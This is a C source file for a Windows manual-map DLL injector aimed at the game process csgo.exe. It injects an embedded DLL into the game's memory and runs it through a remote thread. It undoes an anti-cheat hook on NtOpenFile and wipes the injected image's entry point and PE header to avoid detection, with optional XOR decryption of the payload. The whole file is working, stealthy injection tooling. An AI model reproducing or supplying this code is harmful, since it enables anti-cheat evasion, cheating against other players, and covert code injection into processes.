#include <stdint.h>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "self.h"

// Target process name
#define PROCESS_NAME L"csgo.exe"

#define ERASE_ENTRY_POINT    TRUE
#define ERASE_PE_HEADER      TRUE
#define DECRYPT_DLL          FALSE

#define SUCCESS_MESSAGE      FALSE

#if DECRYPT_DLL
VOID decryptBinary(LPWSTR key)
{
    SIZE_T keyLenth = wcslen(key);

    for (int i = 0; i < sizeof(binary); i++)
        binary[i] ^= key[i % keyLenth];
}
#endif

typedef struct {
    PBYTE imageBase;
    HMODULE(WINAPI* loadLibraryA)(PCSTR);
    FARPROC(WINAPI* getProcAddress)(HMODULE, PCSTR);
    VOID(WINAPI* rtlZeroMemory)(PVOID, SIZE_T);
} LoaderData;

DWORD WINAPI loadLibrary(LoaderData* loaderData)
{
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(loaderData->imageBase + ((PIMAGE_DOS_HEADER)loaderData->imageBase)->e_lfanew);
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(loaderData->imageBase
        + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD delta = (DWORD)(loaderData->imageBase - ntHeaders->OptionalHeader.ImageBase);
    while (relocation->VirtualAddress) {
        PWORD relocationInfo = (PWORD)(relocation + 1);
        for (int i = 0, count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); i < count; i++)
            if (relocationInfo[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
                *(PDWORD)(loaderData->imageBase + (relocation->VirtualAddress + (relocationInfo[i] & 0xFFF))) += delta;

        relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);
    }

    PIMAGE_IMPORT_DESCRIPTOR importDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(loaderData->imageBase
        + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (importDirectory->Characteristics) {
        PIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA)(loaderData->imageBase + importDirectory->OriginalFirstThunk);
        PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(loaderData->imageBase + importDirectory->FirstThunk);

        HMODULE module = loaderData->loadLibraryA((LPCSTR)loaderData->imageBase + importDirectory->Name);

        if (!module)
            return FALSE;

        while (originalFirstThunk->u1.AddressOfData) {
            DWORD Function = (DWORD)loaderData->getProcAddress(module, originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG ? (LPCSTR)(originalFirstThunk->u1.Ordinal & 0xFFFF) : ((PIMAGE_IMPORT_BY_NAME)((LPBYTE)loaderData->imageBase + originalFirstThunk->u1.AddressOfData))->Name);

            if (!Function)
                return FALSE;

            firstThunk->u1.Function = Function;
            originalFirstThunk++;
            firstThunk++;
        }
        importDirectory++;
    }

    if (ntHeaders->OptionalHeader.AddressOfEntryPoint) {
        DWORD result = ((DWORD(__stdcall*)(HMODULE, DWORD, LPVOID))
            (loaderData->imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint))
            ((HMODULE)loaderData->imageBase, DLL_PROCESS_ATTACH, NULL);

#if ERASE_ENTRY_POINT
        loaderData->rtlZeroMemory(loaderData->imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint, 32);
#endif

#if ERASE_PE_HEADER
        loaderData->rtlZeroMemory(loaderData->imageBase, ntHeaders->OptionalHeader.SizeOfHeaders);
#endif
        return result;
    }
    return TRUE;
}

VOID stub(VOID) { }

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd)
{
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnapshot == INVALID_HANDLE_VALUE)
        return 1;

    HANDLE process = NULL;
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);

    if (Process32FirstW(processSnapshot, &processInfo)) {
        do {
            if (!lstrcmpW(processInfo.szExeFile, PROCESS_NAME)) {
                process = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, processInfo.th32ProcessID);
                break;
            }
        } while (Process32NextW(processSnapshot, &processInfo));
    }
    CloseHandle(processSnapshot);

    if (!process)
        return 1;

#if DECRYPT_DLL
    INT argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    for (INT i = 1; i < argc; i++) {
        if (!lstrcmpW(argv[i], L"-key")) {
            decryptBinary(argv[++i]);
            break;
        }
    }
    LocalFree(argv);
#endif

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(binary + ((PIMAGE_DOS_HEADER)binary)->e_lfanew);

    LPVOID ntOpenFile = GetProcAddress(LoadLibraryW(L"ntdll"), "NtOpenFile");
    char originalBytes[5], patchedBytes[5];
    if (ntOpenFile) {
        ReadProcessMemory(process, ntOpenFile, patchedBytes, 5, NULL);
        memcpy(originalBytes, ntOpenFile, 5);
        WriteProcessMemory(process, ntOpenFile, originalBytes, 5, NULL);
    }

    PBYTE executableImage = VirtualAllocEx(process, NULL, ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(process, executableImage, binary,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
        WriteProcessMemory(process, executableImage + sectionHeaders[i].VirtualAddress,
        binary + sectionHeaders[i].PointerToRawData, sectionHeaders[i].SizeOfRawData, NULL);

    LoaderData* loaderMemory = VirtualAllocEx(process, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READ);

    LoaderData loaderParams;
    loaderParams.imageBase = executableImage;
    loaderParams.loadLibraryA = LoadLibraryA;
    loaderParams.getProcAddress = GetProcAddress;
    loaderParams.rtlZeroMemory = (VOID(NTAPI*)(PVOID, SIZE_T))GetProcAddress(LoadLibraryW(L"ntdll"), "RtlZeroMemory");

    WriteProcessMemory(process, loaderMemory, &loaderParams, sizeof(LoaderData),
        NULL);
    WriteProcessMemory(process, loaderMemory + 1, loadLibrary,
        (DWORD)stub - (DWORD)loadLibrary, NULL);
    WaitForSingleObject(CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)(loaderMemory + 1),
        loaderMemory, 0, NULL), INFINITE);
    WriteProcessMemory(process, ntOpenFile, patchedBytes, 5, NULL);
    VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);

#if SUCCESS_MESSAGE
    CHAR buf[100];
    sprintf_s(buf, sizeof(buf), "Dll successfully loaded into %ws at 0x%x", PROCESS_NAME, (DWORD)executableImage);
    MessageBoxA(NULL, buf, "Success", MB_OK | MB_ICONINFORMATION);
#endif
    return TRUE;
}
